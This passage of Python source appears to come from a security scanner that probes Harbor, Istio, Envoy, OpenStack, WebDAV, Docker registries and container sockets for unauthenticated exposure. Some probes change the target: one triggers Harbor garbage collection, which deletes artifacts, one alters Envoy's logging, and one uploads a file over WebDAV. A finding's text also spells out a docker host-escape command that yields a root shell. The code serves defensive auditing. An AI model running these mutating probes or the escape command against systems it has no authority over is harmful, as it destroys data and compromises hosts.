    status, _data = _standalone_post(host, port, "/api/v2.0/registries/ping", ping_body, timeout)
    if status == 200:
        findings.append({
            "severity": "HIGH",
            "title": "HARBOR_REGISTRY_PING_UNAUTH",
            "detail": (
                "Registry ping endpoint accepts unauthenticated POST to "
                "/api/v2.0/registries/ping — Harbor usable as unauthenticated "
                "upstream-registry reachability probe"
            ),
            "host": host,
            "port": port,
        })

    # Proxy-cache projects — pull-through configuration exposed
    status, data = _standalone_get(host, port, "/api/v2.0/projects?type=proxy_cache&page_size=50", timeout)
    if status == 200 and isinstance(data, list) and data:
        count = len(data)
        names = [p.get("name", "") for p in data if isinstance(p, dict) and p.get("name")]
        name_sample = ", ".join(names[:5]) + (" ..." if len(names) > 5 else "")
        findings.append({
            "severity": "HIGH",
            "title": "HARBOR_PROXY_CACHE_PROJECTS",
            "detail": (
                f"Proxy-cache project list readable without authentication via "
                f"GET /api/v2.0/projects?type=proxy_cache — {count} project(s): {name_sample}"
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_harbor_gc_and_retention(host, port=443, timeout=5.0):
    """Probe Harbor garbage-collection schedule, retention policy, and system info without auth.

    Dynamic analysis of malware persistence mechanisms maps directly to this surface:
    GC schedules are Harbor's cleanup cron — an attacker who can read or trigger them
    controls artifact lifecycle the same way persistence malware controls autoruns.
    Retention policies leak project structure and tagging conventions.  System info
    is the reconnaissance stage: just as a sandbox captures every file the specimen
    touches at first launch, this probe captures every config field Harbor exposes
    before a session exists.

    Checks:
      MEDIUM   — HARBOR_GC_SCHEDULE_EXPOSED      GET /api/v2.0/system/gc returns 200
                                                 unauth; garbage-collection schedule
                                                 and last-run metadata exposed.
      MEDIUM   — HARBOR_RETENTION_POLICY_EXPOSED GET /api/v2.0/retentions/1 returns
                                                 200 unauth; retention rules, project
                                                 scope, and tag selectors readable.
      HIGH     — HARBOR_GC_TRIGGER_UNAUTH        POST /api/v2.0/system/gc returns 200
                                                 or 202 without auth; unauthenticated
                                                 caller can initiate garbage collection,
                                                 causing artifact deletion.
      HIGH     — HARBOR_SYSTEM_INFO_UNAUTH       GET /api/v2.0/systeminfo returns 200
                                                 unauth; TLS state, registry URL, and
                                                 storage capacity exposed.
      CRITICAL — HARBOR_ADMIN_PASSWORD_EXPOSED   admin_initial_password field present
                                                 in /api/v2.0/systeminfo response.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    # GC schedule — lifecycle control surface
    status, data = _standalone_get(host, port, "/api/v2.0/system/gc", timeout)
    if status == 200:
        schedule_hint = ""
        if isinstance(data, list) and data:
            first = data[0]
            if isinstance(first, dict):
                sched = first.get("schedule", {}) or {}
                schedule_hint = f"; schedule type={sched.get('type', 'unknown')}, cron={sched.get('cron', '')}"
        elif isinstance(data, dict):
            sched = data.get("schedule", {}) or {}
            schedule_hint = f"; schedule type={sched.get('type', 'unknown')}, cron={sched.get('cron', '')}"
        findings.append({
            "severity": "MEDIUM",
            "title": "HARBOR_GC_SCHEDULE_EXPOSED",
            "detail": (
                "Garbage-collection schedule readable without authentication via "
                f"GET /api/v2.0/system/gc{schedule_hint}"
            ),
            "host": host,
            "port": port,
        })

    # Retention policy — project structure and tag conventions
    status, data = _standalone_get(host, port, "/api/v2.0/retentions/1", timeout)
    if status == 200:
        rule_count = 0
        if isinstance(data, dict):
            rule_count = len(data.get("rules", []) or [])
        findings.append({
            "severity": "MEDIUM",
            "title": "HARBOR_RETENTION_POLICY_EXPOSED",
            "detail": (
                "Retention policy readable without authentication via "
                f"GET /api/v2.0/retentions/1 — {rule_count} rule(s) exposed"
            ),
            "host": host,
            "port": port,
        })

    # GC trigger — unauthenticated destructive action
    status, _data = _standalone_post(host, port, "/api/v2.0/system/gc", {}, timeout)
    if status in (200, 201, 202):
        findings.append({
            "severity": "HIGH",
            "title": "HARBOR_GC_TRIGGER_UNAUTH",
            "detail": (
                f"Garbage collection triggered without authentication via POST "
                f"/api/v2.0/system/gc (HTTP {status}) — unauthenticated callers can "
                "initiate artifact deletion"
            ),
            "host": host,
            "port": port,
        })

    # System info — registry config and storage stats; admin password critical if present
    status, data = _standalone_get(host, port, "/api/v2.0/systeminfo", timeout)
    if status == 200:
        if isinstance(data, dict) and data.get("admin_initial_password"):
            findings.append({
                "severity": "CRITICAL",
                "title": "HARBOR_ADMIN_PASSWORD_EXPOSED",
                "detail": (
                    "admin_initial_password field returned in unauthenticated GET "
                    "/api/v2.0/systeminfo response — full administrative credential exposed"
                ),
                "host": host,
                "port": port,
            })
        tls = ""
        if isinstance(data, dict):
            tls = f"; with_notary={data.get('with_notary')}, with_clair={data.get('with_clair')}"
        findings.append({
            "severity": "HIGH",
            "title": "HARBOR_SYSTEM_INFO_UNAUTH",
            "detail": (
                "System info readable without authentication via GET /api/v2.0/systeminfo "
                f"— registry URL, TLS state, and storage stats exposed{tls}"
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_harbor_vulnerability_scan(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe Harbor image vulnerability scan data surface without authentication.

    Derived from Kubernetes security supply-chain guidance: image registries that
    surface scan results without a session allow unauthenticated callers to enumerate
    which images carry unpatched CVEs — the same intelligence an attacker needs to
    select a lateral-movement or privilege-escalation payload already resident in
    the cluster.  Critical-severity CVE counts are CRITICAL findings because they
    confirm exploitable images are reachable without authorization barriers.

    Checks:
      HIGH     — HARBOR_SCAN_RESULTS_EXPOSED   GET /api/v2.0/projects/{proj}/
                                               repositories/{repo}/artifacts?
                                               with_scan_overview=true returns 200
                                               unauth; full vulnerability scan data
                                               readable without a session.
      CRITICAL — HARBOR_CRITICAL_VULNS         Response contains one or more
                                               Critical-severity CVEs; exploitable
                                               images enumerable without credentials.
      MEDIUM   — HARBOR_SCANNERS_EXPOSED       GET /api/v2.0/scanners returns 200
                                               unauth; scanner adapter configs
                                               (endpoint URLs, auth hints) readable.
      HIGH     — HARBOR_PUBLIC_PROJECTS        GET /api/v2.0/projects returns one or
                                               more projects with metadata.public=true;
                                               image pull surface open without auth.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    # Resolve a real project and repository to probe artifact scan data.
    # GET /api/v2.0/projects — collect public project names for artifact probe.
    proj_status, proj_data = _standalone_get(host, port, "/api/v2.0/projects", timeout)
    public_projects = []
    if proj_status == 200 and isinstance(proj_data, list):
        public_projects = [
            p for p in proj_data
            if isinstance(p, dict)
            and (p.get("metadata", {}) or {}).get("public", "false") in ("true", True, 1)
        ]

    # Pick a project to probe — prefer public, fall back to first available.
    probe_project = None
    if public_projects:
        probe_project = (public_projects[0].get("name") or "").strip() or None
    if not probe_project and isinstance(proj_data, list) and proj_data:
        probe_project = (proj_data[0].get("name") or "").strip() if isinstance(proj_data[0], dict) else None
    if not probe_project:
        probe_project = "library"

    # Resolve a repository within that project.
    repo_status, repo_data = _standalone_get(
        host, port, f"/api/v2.0/projects/{probe_project}/repositories", timeout
    )
    probe_repo = None
    if repo_status == 200 and isinstance(repo_data, list) and repo_data:
        raw_name = (repo_data[0].get("name") or "") if isinstance(repo_data[0], dict) else ""
        # Harbor repository names are returned as "<project>/<repo>"; strip the project prefix.
        probe_repo = raw_name.split("/", 1)[1] if "/" in raw_name else raw_name
    if not probe_repo:
        probe_repo = "alpine"

    # Artifact scan overview — the primary signal.
    artifact_path = (
        f"/api/v2.0/projects/{probe_project}/repositories/{probe_repo}"
        f"/artifacts?with_scan_overview=true&page_size=5"
    )
    art_status, art_data = _standalone_get(host, port, artifact_path, timeout)
    if art_status == 200:
        # Count Critical-severity CVEs across all returned artifacts.
        critical_count = 0
        if isinstance(art_data, list):
            for artifact in art_data:
                if not isinstance(artifact, dict):
                    continue
                scan_overview = artifact.get("scan_overview") or {}
                for _mime, report in scan_overview.items() if isinstance(scan_overview, dict) else []:
                    summary = (report.get("summary") or {}) if isinstance(report, dict) else {}
                    severity_counts = (summary.get("summary") or {}) if isinstance(summary, dict) else {}
                    critical_count += int(severity_counts.get("Critical", 0) or 0)

        findings.append({
            "severity": "HIGH",
            "title": "HARBOR_SCAN_RESULTS_EXPOSED",
            "detail": (
                f"Vulnerability scan data readable without authentication via GET "
                f"{artifact_path} (HTTP {art_status}) — image CVE reports exposed for "
                f"project '{probe_project}', repository '{probe_repo}'"
            ),
            "host": host,
            "port": port,
        })

        if critical_count > 0:
            findings.append({
                "severity": "CRITICAL",
                "title": "HARBOR_CRITICAL_VULNS",
                "detail": (
                    f"{critical_count} Critical-severity CVE(s) present in unauth-readable "
                    f"registry artifacts under project '{probe_project}' — exploitable images "
                    "enumerable without credentials"
                ),
                "host": host,
                "port": port,
            })

    # Scanner adapter list — endpoint URLs and adapter metadata.
    scan_status, scan_data = _standalone_get(host, port, "/api/v2.0/scanners", timeout)
    if scan_status == 200:
        count = len(scan_data) if isinstance(scan_data, list) else "unknown"
        findings.append({
            "severity": "MEDIUM",
            "title": "HARBOR_SCANNERS_EXPOSED",
            "detail": (
                f"Scanner adapter configuration readable without authentication via GET "
                f"/api/v2.0/scanners (HTTP {scan_status}) — {count} adapter record(s) "
                "including endpoint URLs visible to unauthenticated callers"
            ),
            "host": host,
            "port": port,
        })

    # Public projects — image pull surface.
    if proj_status == 200 and public_projects:
        name_sample = ", ".join(
            p.get("name", "") for p in public_projects[:5] if isinstance(p, dict)
        )
        if len(public_projects) > 5:
            name_sample += " ..."
        findings.append({
            "severity": "HIGH",
            "title": "HARBOR_PUBLIC_PROJECTS",
            "detail": (
                f"{len(public_projects)} public project(s) readable without authentication "
                f"via GET /api/v2.0/projects: {name_sample}"
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_harbor_image_signing(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe Harbor image signing and admission-control configuration without authentication.

    Kubernetes supply-chain security depends on content trust enforcement: without it
    unsigned images can be pulled into any cluster node that trusts the registry.
    An unauthenticated caller who can read these configuration fields learns which
    image-signing and CVE-gate controls are missing before submitting a single image
    pull — the pre-attack reconnaissance step described in Kubernetes security guidance
    on supply chain hardening.

    Checks:
      HIGH   — HARBOR_CONTENT_TRUST_DISABLED      GET /api/v2.0/configurations returns
                                                  content_trust_enable.value=false (or
                                                  absent); unsigned images accepted
                                                  system-wide.
      MEDIUM — PROJECT_NO_CONTENT_TRUST           One or more projects have
                                                  metadata.enable_content_trust != "true";
                                                  unsigned image policy gap at project level.
      HIGH   — HARBOR_VULNERABLE_IMAGES_ALLOWED   One or more projects have
                                                  metadata.prevent_vul != "true" or
                                                  severity threshold absent; Critical-CVE
                                                  images run without admission block.
      MEDIUM — HARBOR_TOKEN_SERVICE_EXPOSED       GET /service/token returns 200 or 401
                                                  without TLS error; token service reachable
                                                  unauthenticated — credential stuffing
                                                  surface available.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    # System-level configuration — content trust and vulnerability gate.
    cfg_status, cfg_data = _standalone_get(host, port, "/api/v2.0/configurations", timeout)
    if cfg_status == 200 and isinstance(cfg_data, dict):
        # content_trust_enable is a wrapped value: {"value": true/false, "editable": bool}
        ct_entry = cfg_data.get("content_trust_enable") or {}
        ct_value = ct_entry.get("value") if isinstance(ct_entry, dict) else ct_entry
        # Treat absent, false, "false", 0 all as disabled.
        if ct_value not in (True, "true", 1):
            findings.append({
                "severity": "HIGH",
                "title": "HARBOR_CONTENT_TRUST_DISABLED",
                "detail": (
                    "content_trust_enable is not set to true in GET /api/v2.0/configurations "
                    f"(value={ct_value!r}) — unsigned images accepted system-wide; "
                    "supply chain signing enforcement absent"
                ),
                "host": host,
                "port": port,
            })

    # Per-project content trust and CVE-gate settings.
    proj_status, proj_data = _standalone_get(host, port, "/api/v2.0/projects", timeout)
    if proj_status == 200 and isinstance(proj_data, list):
        no_trust_projects = []
        allow_vuln_projects = []
        for p in proj_data:
            if not isinstance(p, dict):
                continue
            meta = p.get("metadata") or {}
            pname = p.get("name", "")
            # content trust per-project gate
            if (meta.get("enable_content_trust") or "false") not in ("true", True, 1):
                no_trust_projects.append(pname)
            # vulnerability image admission block
            if (meta.get("prevent_vul") or "false") not in ("true", True, 1):
                allow_vuln_projects.append(pname)

        if no_trust_projects:
            sample = ", ".join(no_trust_projects[:5])
            if len(no_trust_projects) > 5:
                sample += " ..."
            findings.append({
                "severity": "MEDIUM",
                "title": "PROJECT_NO_CONTENT_TRUST",
                "detail": (
                    f"{len(no_trust_projects)} project(s) have content trust disabled "
                    f"(metadata.enable_content_trust != true): {sample} — "
                    "unsigned images accepted without a signing policy gap warning"
                ),
                "host": host,
                "port": port,
            })

        if allow_vuln_projects:
            sample = ", ".join(allow_vuln_projects[:5])
            if len(allow_vuln_projects) > 5:
                sample += " ..."
            findings.append({
                "severity": "HIGH",
                "title": "HARBOR_VULNERABLE_IMAGES_ALLOWED",
                "detail": (
                    f"{len(allow_vuln_projects)} project(s) lack a vulnerability image block "
                    f"(metadata.prevent_vul != true): {sample} — Critical-CVE images can run "
                    "in cluster nodes pulling from these projects without admission control"
                ),
                "host": host,
                "port": port,
            })

    # Token service reachability — credential stuffing surface.
    tok_status, _tok_data = _standalone_get(host, port, "/service/token", timeout)
    if tok_status in (200, 401):
        findings.append({
            "severity": "MEDIUM",
            "title": "HARBOR_TOKEN_SERVICE_EXPOSED",
            "detail": (
                f"Registry token service reachable without TLS client auth via GET "
                f"/service/token (HTTP {tok_status}) — credential stuffing and token "
                "scope enumeration surface available to unauthenticated callers"
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_istio_control_plane(host: str, port: int = 15014, timeout: float = 10.0) -> list:
    """Probe Istio control plane debug and management endpoints for unauthenticated access."""
    import urllib.request
    import urllib.error

    findings = []

    def _get(url, label, severity, title, detail):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    findings.append({
                        "severity": severity,
                        "title": title,
                        "detail": detail,
                        "host": host,
                        "port": port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    _get(
        f"http://{host}:15014/debug/syncz",
        "syncz",
        "HIGH",
        "ISTIO_DEBUG_UNAUTH",
        "Istio control plane debug endpoint accessible — /debug/syncz exposes xDS sync state "
        "across all proxies without authentication, revealing service mesh topology and config "
        "distribution status",
    )

    _get(
        f"http://{host}:8080/metrics",
        "pilot-metrics",
        "HIGH",
        "ISTIO_PILOT_METRICS_UNAUTH",
        "Istiod metrics exposed (service topology) — Pilot /metrics endpoint accessible without "
        "auth, leaking service discovery state, endpoint counts, and xDS push statistics that "
        "enumerate the mesh participant inventory",
    )

    _get(
        f"http://{host}:15010/",
        "xds-plaintext",
        "CRITICAL",
        "ISTIO_XDS_PLAINTEXT",
        "Istio xDS gRPC without mTLS (policy/cert distribution unencrypted) — port 15010 serves "
        "the xDS control plane over plaintext, meaning certificate bundles, authorization "
        "policies, and service configuration are distributed without transport encryption or "
        "mutual authentication",
    )

    _get(
        f"http://{host}:15017/healthz/ready",
        "webhook",
        "MEDIUM",
        "ISTIO_WEBHOOK_EXPOSED",
        "Istio mutating webhook health endpoint accessible — /healthz/ready on the sidecar "
        "injection webhook port is reachable without authentication, confirming webhook "
        "presence and enabling targeted injection bypass research",
    )

    return findings


def probe_envoy_admin_interface(host: str, port: int = 9901, timeout: float = 10.0) -> list:
    """Probe Envoy proxy admin interface for unauthenticated access and configuration exposure."""
    import urllib.request
    import urllib.error

    findings = []

    def _get(url, severity, title, detail):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    findings.append({
                        "severity": severity,
                        "title": title,
                        "detail": detail,
                        "host": host,
                        "port": port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    def _post(url, severity, title, detail):
        try:
            req = urllib.request.Request(
                url,
                data=b"",
                method="POST",
                headers={"User-Agent": "Mozilla/5.0", "Content-Length": "0"},
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    findings.append({
                        "severity": severity,
                        "title": title,
                        "detail": detail,
                        "host": host,
                        "port": port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    _get(
        f"http://{host}:{port}/ready",
        "HIGH",
        "ENVOY_ADMIN_UNAUTH",
        "Envoy admin interface accessible without authentication — /ready confirms the admin "
        "listener is bound and reachable; all admin endpoints (config_dump, clusters, stats, "
        "logging) are exposed to any network-adjacent caller",
    )

    _get(
        f"http://{host}:{port}/config_dump",
        "CRITICAL",
        "ENVOY_CONFIG_DUMP_UNAUTH",
        "Complete Envoy configuration exposed (upstream endpoints, TLS certs, routes) — "
        "/config_dump returns the full live proxy configuration including listener definitions, "
        "cluster endpoints, TLS certificate material, route tables, and secret references "
        "without any authentication requirement",
    )

    _get(
        f"http://{host}:{port}/clusters",
        "CRITICAL",
        "ENVOY_CLUSTERS_UNAUTH",
        "Upstream service clusters enumerable — /clusters returns all configured upstream "
        "endpoints with health status, load balancing weights, and connection statistics, "
        "providing a complete map of backend service topology to unauthenticated callers",
    )

    _post(
        f"http://{host}:{port}/logging?level=debug",
        "CRITICAL",
        "ENVOY_ADMIN_WRITE_UNAUTH",
        "Envoy admin allows configuration changes without auth — POST /logging?level=debug "
        "accepted, confirming the admin interface permits runtime mutation; an attacker can "
        "alter log verbosity, drain listeners, trigger graceful shutdown, or modify runtime "
        "parameters without credentials",
    )

    return findings


def probe_openstack_api(host: str, port: int = 5000, timeout: float = 10.0) -> list:
    findings = []

    def _get(url, severity, title, detail):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                findings.append({
                    "severity": severity,
                    "title": title,
                    "detail": detail,
                    "host": host,
                    "port": resp.url.split(":")[2].split("/")[0] if ":" in resp.url else port,
                })
        except Exception:
            pass

    _get(
        f"http://{host}:{port}/v3",
        "HIGH",
        "OPENSTACK_KEYSTONE_EXPOSED",
        "OpenStack identity API accessible — Keystone v3 endpoint at /v3 responded without "
        "authentication, confirming the identity service is network-reachable; token issuance, "
        "domain enumeration, and service catalog queries are available to unauthenticated callers",
    )

    _get(
        f"http://{host}:{port}/v3/endpoints",
        "CRITICAL",
        "OPENSTACK_ENDPOINTS_UNAUTH",
        "OpenStack service catalog enumerable (all API endpoints disclosed) — /v3/endpoints "
        "returned the full service catalog without a valid token, exposing internal API URLs "
        "for Nova, Neutron, Cinder, Swift, Glance, and any other deployed services, providing "
        "a complete internal network map to unauthenticated callers",
    )

    _get(
        f"http://{host}:8774/v2.1/servers",
        "CRITICAL",
        "OPENSTACK_NOVA_UNAUTH",
        "OpenStack compute server list accessible without auth — Nova v2.1 /servers endpoint "
        "responded without a valid X-Auth-Token, exposing the full list of compute instances "
        "including hostnames, IP addresses, flavors, images, and metadata for all tenants "
        "visible to the unauthenticated request",
    )

    _get(
        f"http://{host}:9696/v2/networks",
        "CRITICAL",
        "OPENSTACK_NEUTRON_UNAUTH",
        "OpenStack network topology accessible without authentication — Neutron v2 /networks "
        "endpoint responded without credentials, exposing all configured virtual networks "
        "including VLAN segmentation IDs, subnet ranges, provider network types, and shared "
        "network flags, yielding a complete picture of the datacenter network topology",
    )

    return findings


def probe_webdav_exposure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    findings = []
    base_url = f"http://{host}:{port}"

    def _propfind(depth, url):
        try:
            req = urllib.request.Request(
                url,
                method="PROPFIND",
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Depth": str(depth),
                    "Content-Type": "application/xml",
                },
                data=b'<?xml version="1.0" encoding="utf-8"?>'
                     b'<D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>',
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception:
            return None, b""

    def _options(url):
        try:
            req = urllib.request.Request(url, method="OPTIONS",
                                         headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status, resp.headers.get("Allow", "")
        except urllib.error.HTTPError as e:
            return e.code, e.headers.get("Allow", "") if hasattr(e, "headers") else ""
        except Exception:
            return None, ""

    def _put(url, body):
        try:
            req = urllib.request.Request(
                url,
                method="PUT",
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "text/plain"},
                data=body,
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            return None

    # PROPFIND Depth: 0 — confirm WebDAV is active
    status0, body0 = _propfind(0, base_url + "/")
    if status0 == 207:
        findings.append({
            "severity": "HIGH",
            "title": "WEBDAV_ENABLED",
            "detail": "WebDAV server responding (file access protocol) — PROPFIND Depth:0 "
                      "returned 207 Multi-Status, confirming the WebDAV protocol is active on "
                      "this endpoint; clients can use standard WebDAV methods to interact with "
                      "the server file system",
            "host": host,
            "port": port,
        })

        # PROPFIND Depth: 1 — directory listing
        status1, body1 = _propfind(1, base_url + "/")
        if status1 == 207 and body1.count(b"<D:response") > 1 or body1.count(b"<response") > 1:
            findings.append({
                "severity": "CRITICAL",
                "title": "WEBDAV_DIRECTORY_LISTING",
                "detail": "WebDAV directory listing accessible — PROPFIND Depth:1 returned "
                          "multiple response elements, exposing the directory tree to any caller; "
                          "file names, sizes, content types, and last-modified timestamps are "
                          "readable without authentication",
                "host": host,
                "port": port,
            })

    # OPTIONS — check for PUT in Allow header
    opt_status, allow_header = _options(base_url + "/")
    if opt_status is not None and "PUT" in allow_header.upper():
        findings.append({
            "severity": "CRITICAL",
            "title": "WEBDAV_PUT_ALLOWED",
            "detail": "WebDAV PUT method enabled (file upload possible) — OPTIONS response "
                      "includes PUT in the Allow header, indicating the server is configured "
                      "to accept file uploads; combined with directory listing this enables "
                      "full read-write access to the served file tree without authentication",
            "host": host,
            "port": port,
        })

        # Attempt unauthenticated PUT to confirm write access
        put_status = _put(base_url + "/test-ablation.txt", b"ablation-probe")
        if put_status == 201:
            findings.append({
                "severity": "CRITICAL",
                "title": "WEBDAV_UNAUTH_UPLOAD",
                "detail": "WebDAV file upload without authentication (arbitrary file write) — "
                          "PUT /test-ablation.txt returned 201 Created, confirming unauthenticated "
                          "write access to the server file system; an attacker can overwrite "
                          "configuration files, plant web shells, or corrupt application data",
                "host": host,
                "port": port,
            })

    return findings


def probe_docker_registry_exposure(host: str, port: int = 5000, timeout: float = 10.0) -> list:
    """Probe unauthenticated Docker registry v2 API exposure."""
    import urllib.request
    import urllib.error
    import json as _json

    findings = []
    base = f"http://{host}:{port}"

    def _get(url):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "ablation-probe/1.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, b""
        except Exception:
            return None, b""

    # v2 API root — presence confirms registry is reachable without auth
    status, body = _get(f"{base}/v2/")
    if status == 200:
        findings.append({
            "severity": "CRITICAL",
            "title": "DOCKER_REGISTRY_UNAUTH",
            "detail": "Docker registry accessible without authentication — GET /v2/ returned 200; "
                      "any caller can enumerate images, pull layers, and extract embedded secrets "
                      "or proprietary code without credentials",
            "host": host,
            "port": port,
        })

        # Image catalog
        cat_status, cat_body = _get(f"{base}/v2/_catalog")
        first_image = None
        if cat_status == 200:
            findings.append({
                "severity": "CRITICAL",
                "title": "DOCKER_REGISTRY_CATALOG_UNAUTH",
                "detail": "Docker registry image catalog enumerable without authentication — "
                          "GET /v2/_catalog returned 200; all image names hosted on this registry "
                          "are disclosed to any unauthenticated caller",
                "host": host,
                "port": port,
            })
            try:
                catalog = _json.loads(cat_body)
                repos = catalog.get("repositories", [])
                if repos:
                    first_image = repos[0]
            except Exception:
                pass

        # Tag list for first image
        if first_image:
            tag_status, tag_body = _get(f"{base}/v2/{first_image}/tags/list")
            if tag_status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "DOCKER_IMAGE_TAGS_UNAUTH",
                    "detail": f"Docker image tags enumerable without authentication — "
                              f"GET /v2/{first_image}/tags/list returned 200; full version history "
                              f"of the image is readable, enabling targeted pull of specific releases "
                              f"or identification of outdated/vulnerable versions",
                    "host": host,
                    "port": port,
                })

            # Manifest for latest tag
            manifest_status, manifest_body = _get(
                f"{base}/v2/{first_image}/manifests/latest"
            )
            if manifest_status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "DOCKER_MANIFEST_UNAUTH",
                    "detail": f"Docker image manifest readable without authentication — "
                              f"GET /v2/{first_image}/manifests/latest returned 200; layer digests, "
                              f"base OS, and build metadata are exposed, enabling precise layer "
                              f"pulls for secret extraction or base-image CVE targeting",
                    "host": host,
                    "port": port,
                })

    return findings


def check_containerd_socket_exposure(socket_path: str = "/run/containerd/containerd.sock") -> list:
    """Check for accessible containerd and Docker daemon sockets on the local host."""
    import os
    import stat
    import socket as _socket

    findings = []

    def _check_socket(path, crit_title, crit_detail, write_title, write_detail):
        if not os.path.exists(path):
            return
        try:
            st = os.stat(path)
            mode = st.st_mode
            world_writable = bool(mode & stat.S_IWOTH)
            group_writable = bool(mode & stat.S_IWGRP)
            if world_writable or group_writable:
                findings.append({
                    "severity": "CRITICAL",
                    "title": crit_title,
                    "detail": crit_detail.format(path=path),
                    "host": "localhost",
                    "port": 0,
                })
        except OSError:
            pass

        # Attempt a Unix domain socket connection with a minimal TTRPC greeting
        try:
            sock = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect(path)
            # TTRPC magic: 4-byte length (0) + 4-byte type (0x01) + minimal payload
            sock.sendall(b"\x00\x00\x00\x00\x00\x00\x00\x01")
            response = sock.recv(16)
            sock.close()
            if response:
                findings.append({
                    "severity": "CRITICAL",
                    "title": write_title,
                    "detail": write_detail.format(path=path),
                    "host": "localhost",
                    "port": 0,
                })
        except Exception:
            pass

    # containerd socket
    _check_socket(
        socket_path,
        "CONTAINERD_SOCKET_ACCESSIBLE",
        "containerd socket at {path} accessible (container escape to host) — "
        "socket exists with world- or group-writable permissions; any local process "
        "can issue containerd API calls to create privileged containers, mount host "
        "paths, or execute arbitrary code as root on the host",
        "CONTAINERD_SOCKET_WRITABLE",
        "containerd socket writable (arbitrary container creation, host escape) — "
        "Unix socket at {path} accepted a connection and responded to a TTRPC probe; "
        "an attacker with local access can spawn containers with host pid/net/mount "
        "namespaces or bind-mount / to achieve full host compromise",
    )

    # Docker daemon socket
    docker_sock = "/var/run/docker.sock"
    _check_socket(
        docker_sock,
        "DOCKER_SOCKET_EXPOSED",
        "Docker daemon socket accessible (root-equivalent code execution) — "
        "socket at {path} exists with world- or group-writable permissions; "
        "any local user can run 'docker run --rm -v /:/host alpine chroot /host' "
        "to obtain a root shell on the host, bypassing all container isolation",
        "DOCKER_SOCKET_EXPOSED",
        "Docker daemon socket writable (root-equivalent code execution) — "
        "socket at {path} accepted a connection; unauthenticated Docker API access "
        "enables arbitrary container creation with host filesystem bind-mounts, "
        "providing trivial privilege escalation to host root",
    )

    return findings


def probe_docker_registry_api_v2(host: str, port: int = 5000, timeout: float = 10.0) -> list:
    """
    Probe Docker Distribution v2 API for unauthenticated access, catalog enumeration,
    tag/manifest/blob disclosure, auth header detection, and Harbor internal port exposure.

    Informed by: web registry credential injection via unauthenticated push surfaces,
    SSRF-to-registry pivots, and malicious-layer supply-chain patterns from
    Bug Bounty Hunting for Web Security ch.6 (malicious file upload via registry push)
    and ch.9 (command injection via container CMD/ENTRYPOINT without auth gate).
    """
    import ssl
    import json as _json
    import urllib.request as _ureq
    import urllib.error as _uerr

    findings = []
    use_tls = (port == 443)
    scheme = "https" if use_tls else "http"
    base = f"{scheme}://{host}:{port}"

    def _tls_ctx():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _get(url, extra_headers=None, tls=False):
        hdrs = {"User-Agent": "ablation-probe/1.0"}
        if extra_headers:
            hdrs.update(extra_headers)
        try:
            req = _ureq.Request(url, headers=hdrs)
            if tls:
                with _ureq.urlopen(req, timeout=timeout, context=_tls_ctx()) as r:
                    return r.status, dict(r.headers), r.read()
            else:
                with _ureq.urlopen(req, timeout=timeout) as r:
                    return r.status, dict(r.headers), r.read()
        except _uerr.HTTPError as exc:
            return exc.code, dict(exc.headers), exc.read()
        except Exception:
            return None, {}, b""

    # --- Primary port probe ---
    status, hdrs_map, body = _get(f"{base}/v2/", tls=use_tls)

    if status == 200:
        try:
            parsed = _json.loads(body)
            is_open = isinstance(parsed, dict)
        except Exception:
            is_open = False
        if is_open:
            findings.append({
                "severity": "CRITICAL",
                "title": "DOCKER_REGISTRY_V2_UNAUTH",
                "detail": (
                    f"Docker Distribution v2 API open without authentication — "
                    f"{scheme}://{host}:{port}/v2/ returned 200 with body "
                    f"{body[:80].decode(errors='replace')!r}; "
                    f"unauthenticated callers can enumerate images, pull layers, "
                    f"and potentially push malicious images"
                ),
                "host": host,
                "port": port,
            })

        # Catalog enumeration
        cat_status, _, cat_body = _get(f"{base}/v2/_catalog", tls=use_tls)
        repos = []
        if cat_status == 200:
            try:
                repos = _json.loads(cat_body).get("repositories", []) or []
            except Exception:
                pass
            findings.append({
                "severity": "CRITICAL",
                "title": "DOCKER_REGISTRY_CATALOG_UNAUTH",
                "detail": (
                    f"Docker registry image catalog exposed unauthenticated — "
                    f"{scheme}://{host}:{port}/v2/_catalog returned 200; "
                    f"{len(repos)} image(s) enumerated: {repos[:5]!r}"
                ),
                "host": host,
                "port": port,
            })

        if repos:
            repo = repos[0]

            # Tag list
            tag_status, _, tag_body = _get(f"{base}/v2/{repo}/tags/list", tls=use_tls)
            tags = []
            if tag_status == 200:
                try:
